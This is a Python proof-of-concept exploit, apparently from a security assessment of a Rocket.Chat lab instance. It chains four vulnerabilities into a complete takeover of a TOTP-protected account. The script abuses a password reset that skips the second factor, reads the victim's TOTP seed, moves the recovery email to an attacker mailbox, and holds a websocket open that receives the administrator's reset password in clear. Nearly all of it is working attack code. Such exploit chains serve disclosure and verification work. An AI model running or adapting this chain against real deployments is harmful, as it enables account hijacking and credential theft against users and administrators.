def api(sess, method, path, **kw):
    """One REST call against the workspace."""
    return sess.request(method, f"{BASE_URL}{path}", timeout=60, **kw)


def login(username, password, code=None):
    """A requests.Session carrying X-Auth-Token / X-User-Id for that account."""
    body = {"user": username, "password": password}
    if code:
        body["code"] = code
    s = requests.Session()
    r = api(s, "POST", "/api/v1/login", json=body)
    d = r.json()
    if d.get("status") != "success":
        raise RuntimeError(f"login {username} failed: {r.status_code} {r.text[:200]}")
    s.headers.update({"X-Auth-Token": d["data"]["authToken"], "X-User-Id": d["data"]["userId"]})
    return s


def sess_for(token, uid):
    """A session built from a raw login token (what step 1 steals)."""
    s = requests.Session()
    s.headers.update({"X-Auth-Token": token, "X-User-Id": uid})
    return s


def mkuser(adm, name, pw):
    """A fresh account with the default role, like a self-registration."""
    r = api(adm, "POST", "/api/v1/users.create", json={
        "username": name, "name": name, "email": f"{name}@lab.invalid", "password": pw,
        "roles": ["user"], "joinDefaultChannels": False, "verified": False,
        "requirePasswordChange": False})
    if not r.json().get("success"):
        raise RuntimeError(f"could not create {name}: {r.text[:200]}")
    return r.json()["user"]["_id"]


def rmuser(adm, uid):
    api(adm, "POST", "/api/v1/users.delete", json={"userId": uid, "confirmRelinquish": True})


def banner(title):
    print("=" * 72)
    print(f"{VULN}: {title}")
    print(f"target : {BASE_URL}")
    print("author : Blue Spider")
    print("=" * 72)


def mail_to(addr, pattern, timeout=45):
    """Wait for a mail addressed to `addr` and return the first match of
    `pattern` in its body. The lab's mail sink stands for the mailbox an
    attacker reads: a shared inbox, an archive, a forwarded message."""
    end = time.time() + timeout
    while time.time() < end:
        for m in _mails_for(addr):
            body = requests.get(f"{MAILPIT}/api/v1/message/{m['ID']}", timeout=10).json()
            hit = _re.search(pattern, (body.get("Text") or "") + (body.get("HTML") or ""))
            if hit:
                return hit.group(1), body
        time.sleep(1.5)
    return None, None


def _mails_for(addr):
    try:
        lst = requests.get(f"{MAILPIT}/api/v1/messages?limit=100", timeout=10).json()
    except Exception:
        return []
    return [m for m in lst.get("messages", [])
            if any(addr == (t.get("Address") or "") for t in m.get("To", []))]


def mail_purge(addr):
    """Drop this run's own mail from the sink, so a later wait cannot match an
    earlier message (the chain asks the same question twice, before and after
    the address moves). Only mail to the addresses this run created is removed."""
    ids = [m["ID"] for m in _mails_for(addr)]
    if ids:
        requests.delete(f"{MAILPIT}/api/v1/messages", json={"IDs": ids}, timeout=15)
    return len(ids)


class Ddp:
    """A minimal Meteor DDP client over /websocket: connect, login, subscribe,
    call methods, and collect the frames the server pushes. Inline on purpose:
    this file stands on its own."""

    def __init__(self, token=None):
        url = BASE_URL.replace("http://", "ws://").replace("https://", "wss://") + "/websocket"
        self.ws = websocket.create_connection(url, timeout=30)
        self.frames, self.lock, self.alive = [], threading.Lock(), True
        self._send({"msg": "connect", "version": "1", "support": ["1", "pre2", "pre1"]})
        threading.Thread(target=self._pump, daemon=True).start()
        self.wait(lambda m: m.get("msg") == "connected", 15)
        if token:
            self.login(token)

    def _send(self, obj):
        self.ws.send(json.dumps(obj))

    def _pump(self):
        while self.alive:
            try:
                raw = self.ws.recv()
            except Exception:
                self.alive = False
                return
            if not raw:
                continue
            try:
                m = json.loads(raw)
            except ValueError:
                continue
            if m.get("msg") == "ping":                   # keep the session open
                try:
                    self._send({"msg": "pong", "id": m.get("id")})
                except Exception:
                    pass
                continue
            with self.lock:
                self.frames.append(m)

    def all(self):
        with self.lock:
            return list(self.frames)

    def wait(self, pred, timeout=20):
        end = time.time() + timeout
        while time.time() < end:
            for m in self.all():
                if pred(m):
                    return m
            time.sleep(0.05)
        return None

    def call(self, method, params=None, timeout=30):
        mid = secrets.token_hex(4)
        self._send({"msg": "method", "method": method, "params": params or [], "id": mid})
        return self.wait(lambda x: x.get("msg") == "result" and x.get("id") == mid, timeout) or {"error": "timeout"}

    def sub(self, name, params=None, timeout=20):
        sid = secrets.token_hex(4)
        self._send({"msg": "sub", "id": sid, "name": name, "params": params or []})
        m = self.wait(lambda x: x.get("msg") in ("ready", "nosub")
                      and (x.get("id") == sid or sid in (x.get("subs") or [])), timeout)
        return sid, (m or {"msg": "timeout"})

    def login(self, token):
        return self.call("login", [{"resume": token}])

    def frames_with(self, needle):
        return [m for m in self.all() if needle in json.dumps(m)]

    def close(self):
        self.alive = False
        try:
            self.ws.close()
        except Exception:
            pass


def main():
    sfx = rand()
    banner("one captured reset link -> permanent ownership of a TOTP-protected account")
    log("INFO", "chaining VULN-015 (reset skips the second factor) -> VULN-004 (the session reads "
                "its own TOTP seed) -> the email-change step-up -> VULN-033 (the socket survives "
                "remediation)")

    adm = login(ADMIN_USER, ADMIN_PASS)
    vic = f"vic_{sfx}"
    vic_addr = f"{vic}@lab.invalid"
    atk_addr = f"atk_{sfx}@lab.invalid"            # the mailbox the attacker owns
    vic_pw = f"Victim-Pass-{sfx}!A"                # the victim's own password; never used below
    evidence = {"victim": vic, "victim_address": vic_addr, "attacker_address": atk_addr}

    # [SETUP] a victim who did everything right: a strong password and TOTP.
    uid = mkuser(adm, vic, vic_pw)
    sv = login(vic, vic_pw)
    seed_real = api(sv, "POST", "/api/v1/users.enableTotp", json={}).json().get("secret")
    api(sv, "POST", "/api/v1/users.validateTotp", json={"code": pyotp.TOTP(seed_real).now()})
    gate = requests.post(f"{BASE_URL}/api/v1/login", json={"user": vic, "password": vic_pw}, timeout=30)
    log("SETUP", f"{vic} <{vic_addr}> enrolled in TOTP; a password login now answers "
                 f"HTTP {gate.status_code} {gate.json().get('error')}")
    evidence["password_login_is_gated_by_totp"] = gate.json()

    # ---------------------------------------------------------------- step 1
    # VULN-015: the reset flow is exempted from the second factor and hands back
    # a login token. The attacker's only input is the mailbox.
    log("STEP", f"1/4 VULN-015: anonymous users.forgotPassword for {vic_addr}")
    fp = requests.post(f"{BASE_URL}/api/v1/users.forgotPassword", json={"email": vic_addr}, timeout=30)
    tok, _ = mail_to(vic_addr, r"/reset-password/([A-Za-z0-9_-]+)")
    if not tok:
        rmuser(adm, uid)
        return verdict("FAILED", "no reset mail arrived, so the chain never started")
    log("STEP", f"    reset link captured from the mailbox (HTTP {fp.status_code}): token {tok[:10]}...")
    atk_pw = f"Attacker-Set-{sfx}!9z"              # the password the attacker chooses
    d_reset = Ddp()
    res = d_reset.call("resetPassword", [tok, {"digest": hashlib.sha256(atk_pw.encode()).hexdigest(),
                                               "algorithm": "sha-256"}])
    d_reset.close()
    stolen = (res.get("result") or {})
    stolen_token, stolen_uid = stolen.get("token"), stolen.get("id")
    if not stolen_token:
        rmuser(adm, uid)
        return verdict("FAILED", f"resetPassword returned no session: {json.dumps(res)[:200]}")
    sa = sess_for(stolen_token, stolen_uid)        # the attacker's session on the victim
    me = api(sa, "GET", "/api/v1/me")
    log("PROOF", f"    the reset handed back a working session with no TOTP code: /api/v1/me HTTP "
                 f"{me.status_code} as {me.json().get('username')}")
    evidence["step1_reset_session"] = {"result": res, "me": me.json().get("username")}

    # ---------------------------------------------------------------- step 2
    # VULN-004: that session reads its own raw services document, which still
    # holds the TOTP seed the reset did not touch. This is the step that turns a
    # revocable session into a permanent credential.
    log("STEP", "2/4 VULN-004: users.info for the caller's own id, with the stolen session")
    path = f"/api/v1/users.info?userId={stolen_uid}"
    r = api(sa, "GET", path)
    svc = (r.json().get("user") or {}).get("services") or {}
    seed = (svc.get("totp") or {}).get("secret")
    backups = (svc.get("totp") or {}).get("hashedBackup") or []
    log("PROOF" if seed else "FAIL",
        f"    services.totp.secret={str(seed)[:12]}... plus {len(backups)} backup-code hashes: the "
        f"second factor is now the attacker's, offline and for ever "
        f"(matches the enrolled seed={seed == seed_real})")
    save("request.http", f"GET {path} HTTP/1.1\r\nHost: {BASE_URL.split('//', 1)[1]}\r\n"
                         f"X-Auth-Token: {stolen_token}\r\nX-User-Id: {stolen_uid}\r\n"
                         f"Accept: application/json\r\n\r\n")
    save("response.txt", f"HTTP/1.1 {r.status_code}\n"
                         + "".join(f"{k}: {v}\n" for k, v in r.headers.items()) + "\n" + r.text)
    evidence["step2_seed"] = {"disclosed_prefix": str(seed)[:12], "backup_hashes": len(backups),
                              "equals_enrolled_seed": seed == seed_real}
    if not seed:
        rmuser(adm, uid)
        return verdict("FAILED", "users.info did not disclose the seed, so the chain stops at a session")

    # ---------------------------------------------------------------- step 3
    # The intended feature: changing the account's email address is a sensitive
    # action, so Rocket.Chat demands a second factor for it
    # (executeSaveUserProfile -> saveUserProfileWithTwoFactor). The attacker now
    # holds that factor, so the protection passes it through.
    log("STEP", f"3/4 feature: move the account's recovery address to {atk_addr}, satisfying the "
                f"second-factor step-up with a code derived from the stolen seed")
    # No currentPassword in the body on purpose: supplying it makes the route
    # choose the password method for the step-up (users.ts:217-222), and the
    # point here is that the TOTP method itself is satisfied with the stolen
    # seed. The code goes in the headers the step-up reads.
    code = pyotp.TOTP(seed).now()
    mv = api(sa, "POST", "/api/v1/users.updateOwnBasicInfo",
             json={"data": {"email": atk_addr}},
             headers={"x-2fa-method": "totp", "x-2fa-code": code})
    now_addr = ((api(sa, "GET", "/api/v1/me").json().get("emails") or [{}])[0]).get("address")
    log("PROOF" if now_addr == atk_addr else "FAIL",
        f"    HTTP {mv.status_code}: the account's address is now {now_addr}")
    evidence["step3_email_move"] = {"status": mv.status_code, "address_now": now_addr,
                                    "response": mv.json()}

    # The proof that the recovery channel really moved: ask the workspace,
    # anonymously, to reset the password again. The mail must arrive in the
    # attacker's mailbox, and the victim's own address must no longer resolve.
    dropped = mail_purge(vic_addr)           # the step-1 mail, so the next wait cannot match it
    requests.post(f"{BASE_URL}/api/v1/users.forgotPassword", json={"email": atk_addr}, timeout=30)
    tok2, body2 = mail_to(atk_addr, r"/reset-password/([A-Za-z0-9_-]+)")
    old = requests.post(f"{BASE_URL}/api/v1/users.forgotPassword", json={"email": vic_addr}, timeout=30)
    tok_old, _ = mail_to(vic_addr, r"/reset-password/([A-Za-z0-9_-]+)", timeout=12)
    log("INFO", f"    (the {dropped} earlier mail(s) to the victim's address were cleared from the "
                f"sink first, so this second question is answered on its own)")
    log("PROOF" if tok2 and not tok_old else "FAIL",
        f"    a fresh reset mail for the account arrived at the attacker's mailbox "
        f"(token {str(tok2)[:10]}...), while the victim's own address produced none "
        f"(HTTP {old.status_code}, token={tok_old}): the recovery channel is the attacker's")
    evidence["step3_recovery_moved"] = {"attacker_mailbox_token": bool(tok2),
                                        "victim_mailbox_token": tok_old,
                                        "forgot_for_old_address": old.json()}
    if body2:
        save("evidence/reset-mail-to-attacker.txt",
             f"To: {atk_addr}\nSubject: {body2.get('Subject')}\n\n{(body2.get('Text') or '')[:2000]}")

    # ---------------------------------------------------------------- step 4
    # VULN-033: the remediation. The attacker holds a DDP socket open on the
    # stolen token; neither the victim's "log out other clients" nor the
    # administrator's password reset closes it, and the administrator's new
    # password is broadcast to it in clear.
    log("STEP", "4/4 VULN-033: hold the stolen session's socket open across the remediation")
    d = Ddp(token=stolen_token)
    _, sub_user = d.sub("stream-notify-user", [f"{stolen_uid}/notification", False])
    _, sub_data = d.sub("stream-notify-user", [f"{stolen_uid}/userData", False])
    log("SETUP", f"    attacker socket subscribed: notification -> {sub_user.get('msg')}, "
                 f"userData -> {sub_data.get('msg')}")

    # the victim does what the product tells them to do after a compromise
    sv2 = login(vic, atk_pw, code=pyotp.TOTP(seed).now())   # the victim recovers their account
    lo = api(sv2, "POST", "/api/v1/users.removeOtherTokens", json={})
    time.sleep(2)
    alive_after_logout = d.alive
    adm_pw = f"Admin-Reset-{sfx}!7x"
    upd = api(adm, "POST", "/api/v1/users.update",
              json={"userId": stolen_uid, "data": {"password": adm_pw}}, headers={
                  "x-2fa-method": "password",
                  "x-2fa-code": hashlib.sha256(ADMIN_PASS.encode()).hexdigest()})
    leaked = None
    fr = d.wait(lambda m: m.get("msg") == "changed" and "password" in json.dumps(m.get("fields", {})), 20)
    if fr:
        for arg in (fr.get("fields", {}) or {}).get("args", []):
            if isinstance(arg, dict) and isinstance(arg.get("diff"), dict) and arg["diff"].get("password"):
                leaked = arg["diff"]["password"]
    log("PROOF" if leaked else "FAIL",
        f"    after users.removeOtherTokens (HTTP {lo.status_code}) the socket is still alive="
        f"{alive_after_logout}; the administrator's reset (HTTP {upd.status_code}) arrived on it in "
        f"clear: {leaked!r}")
    evidence["step4_remediation"] = {"remove_other_tokens": lo.status_code,
                                     "socket_alive_after_logout": alive_after_logout,
                                     "admin_update": upd.status_code,
                                     "password_broadcast": leaked,
                                     "frame": fr}
    # the end state: the attacker logs back in with the password the
    # administrator just set, and passes the second factor with the stolen seed.
    final = requests.post(f"{BASE_URL}/api/v1/login",
                          json={"user": vic, "password": leaked or adm_pw,
                                "code": pyotp.TOTP(seed).now()}, timeout=30)
    back_in = final.json().get("status") == "success"
    log("PROOF" if back_in else "FAIL",
        f"    logging in with the administrator's new password and a code from the stolen seed: "
        f"HTTP {final.status_code} success={back_in}")
    evidence["step4_relogin"] = {"status": final.status_code, "success": back_in}
    d.close()

    save("evidence/chain-001.json", json.dumps(evidence, indent=2, default=str))

    # cleanup: only what this run created.
    log("INFO", "cleanup: deleting the victim account this run created and clearing its mail")
    rmuser(adm, uid)
    mail_purge(vic_addr)
    mail_purge(atk_addr)

    reached = bool(seed) and now_addr == atk_addr and bool(tok2) and not tok_old and back_in
    if reached:
        return verdict("CONFIRMED",
                       "one captured reset link produced a session without the second factor, that "
                       "session read the account's TOTP seed, the seed passed the step-up that moved "
                       "the recovery address to the attacker, and the attacker's socket survived the "
                       "remediation and received the administrator's new password in clear")
    return verdict("FAILED",
                   f"seed={bool(seed)} address_moved={now_addr == atk_addr} "
                   f"attacker_gets_resets={bool(tok2)} victim_locked_out={not tok_old} "
                   f"relogin={back_in}")


if __name__ == "__main__":
    sys.exit(main())
